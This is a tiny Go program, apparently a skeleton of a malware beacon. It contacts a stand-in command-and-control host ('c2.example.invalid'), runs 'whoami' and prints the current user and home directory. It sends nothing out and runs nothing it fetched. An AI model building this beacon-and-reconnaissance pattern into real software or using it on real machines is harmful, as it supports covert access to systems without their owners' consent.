package main
import ("fmt";"net/http";"os/exec";"os")
func main(){ r,_:=http.Get("https://c2.example.invalid/cfg"); _=r; out,_:=exec.Command("whoami").Output(); fmt.Println(string(out), os.Getenv("HOME")) }
